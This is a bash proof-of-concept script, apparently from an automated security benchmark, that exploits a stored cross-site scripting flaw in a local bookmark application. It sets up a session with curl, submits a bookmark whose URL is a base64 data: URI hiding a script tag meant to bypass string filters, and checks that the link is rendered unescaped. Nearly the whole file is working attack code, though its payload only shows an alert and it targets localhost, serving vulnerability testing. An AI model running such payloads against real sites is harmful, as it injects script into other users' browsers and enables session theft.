#!/bin/bash
# POC: Demonstrates Stored XSS vulnerability via data: URI with base64-encoded JavaScript payload in bookmark URL field
# Target: ./repo
# Created: 2025-11-07T17:40:05.072Z
# Session: benchmark-XBEN-075-24-mhp4u83c

# Stored XSS via Data URI with Base64-Encoded JavaScript POC
# This script demonstrates the vulnerability where data: URIs with base64-encoded 
# malicious content can bypass simple string-matching filters and execute in the browser

TARGET_URL="http://localhost:5000"
COOKIES_FILE="/tmp/xss_cookies.txt"

echo "[*] Stored XSS via Data URI Base64 Payload POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Visit the list page to establish session
echo "[+] Step 1: Establishing session by visiting /list endpoint..."
curl -s -c "$COOKIES_FILE" "$TARGET_URL/list" > /dev/null

if [ ! -f "$COOKIES_FILE" ]; then
    echo "[-] Failed to establish session"
    exit 1
fi

echo "[+] Session established, cookies saved to $COOKIES_FILE"
echo ""

# Step 2: Submit a malicious bookmark with data: URI containing base64-encoded JavaScript
echo "[+] Step 2: Submitting malicious bookmark with data: URI..."
PAYLOAD="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIFZ1bG5lcmFiaWxpdHkgUHJvdmVkJyk8L3NjcmlwdD4="
BOOKMARK_NAME="Malicious Bookmark"

echo "[*] Payload (base64): $PAYLOAD"
echo "[*] Decoding base64 payload to show actual content..."
DECODED=$(echo "PHNjcmlwdD5hbGVydCgnWFNTIFZ1bG5lcmFiaWxpdHkgUHJvdmVkJyk8L3NjcmlwdD4=" | base64 -d)
echo "[*] Decoded payload: $DECODED"
echo ""

# Submit the malicious bookmark
curl -s -b "$COOKIES_FILE" \
    -X POST "$TARGET_URL/add" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "name=$BOOKMARK_NAME&url=$PAYLOAD" \
    -c "$COOKIES_FILE" > /dev/null

if [ $? -ne 0 ]; then
    echo "[-] Failed to submit bookmark"
    exit 1
fi

echo "[+] Malicious bookmark submitted successfully"
echo ""

# Step 3: Retrieve the list page and verify the payload is stored unescaped
echo "[+] Step 3: Retrieving /list page to verify stored XSS..."
LIST_RESPONSE=$(curl -s -b "$COOKIES_FILE" "$TARGET_URL/list")

# Check if the data: URI is present in the response
if echo "$LIST_RESPONSE" | grep -q "data:text/html;base64"; then
    echo "[+] SUCCESS: Data URI payload found in response!"
    echo ""
    
    # Check if it's in an href attribute (vulnerable rendering)
    if echo "$LIST_RESPONSE" | grep -q "href=\"data:"; then
        echo "[+] CRITICAL: Payload is rendered in href attribute - will execute when clicked!"
        echo ""
        
        # Extract and display the vulnerable link
        echo "[+] Vulnerable link found:"
        echo "$LIST_RESPONSE" | grep -o "href=\"data:[^\"]*" | head -1
        echo ""
        
        # Check if the payload is properly unescaped (not HTML-encoded)
        if echo "$LIST_RESPONSE" | grep -q "href=\"data:text/html;base64,PHNjcmlwdD" && ! echo "$LIST_RESPONSE" | grep -q "href=\"&.*PHNjcmlwdD"; then
            echo "[+] CONFIRMED: Payload is unescaped in href attribute"
            echo "[+] When user clicks this link, the browser will:"
            echo "    1. Interpret the data: URI as HTML content"
            echo "    2. Execute the base64-decoded JavaScript: <script>alert('XSS Vulnerability Proved')</script>"
            echo ""
            echo "[✓] Vulnerability CONFIRMED - Stored XSS via Data URI Base64"
            
            # Clean up
            rm -f "$COOKIES_FILE"
            exit 0
        fi
    fi
fi

echo "[-] Vulnerability check inconclusive"
rm -f "$COOKIES_FILE"
exit 1